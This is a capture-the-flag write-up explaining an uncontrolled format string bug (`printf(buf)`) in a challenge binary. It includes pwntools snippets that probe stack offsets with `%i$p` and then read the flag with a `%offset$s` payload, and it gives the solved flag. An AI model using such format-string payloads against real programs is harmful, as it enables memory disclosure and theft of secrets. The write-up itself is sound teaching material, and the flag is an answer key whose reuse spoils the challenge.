## Vulnerability Explanation

The binary uses an uncontrolled format string in this line:

```c
read(0, buf, 16);
printf(buf);
```

Since buf comes directly from user input, printf treats it as its format string. This allows us to:
Leak memory using %p or %s specifiers at arbitrary stack offsets.

## Exploitation Steps

1- Leak the flag buffer addressThe program prints:
`Your flag at 0x55...`

2- We parse that %p output to get the pointer flag_addr where the flag string is stored.

3- Discover the correct format-parameter offset inside the loop, it repeatedly prompts:
`echo <input>`

We send payloads like `%1$p, %2$p, … ` to find at which stack index the flag_addr appears. For each i:

```py
r.sendlineafter(b"echo ", f"%{i}$p".encode())
leak = r.recvline().strip()
if int(leak,16) == int(flag_addr, 16): break
```

Read the flag string once the correct offset is found, we send:

```py
payload = f"%{offset}$s".encode()
r.sendlineafter(b"echo ", payload)
flag = r.recvline()
```

%s interprets the stack value at offset as a pointer and prints the null-terminated string at that address (the flag).

### Flag: ghctf{m33t*f0rm4t*$tr1ng_vuln3r4b1lity}
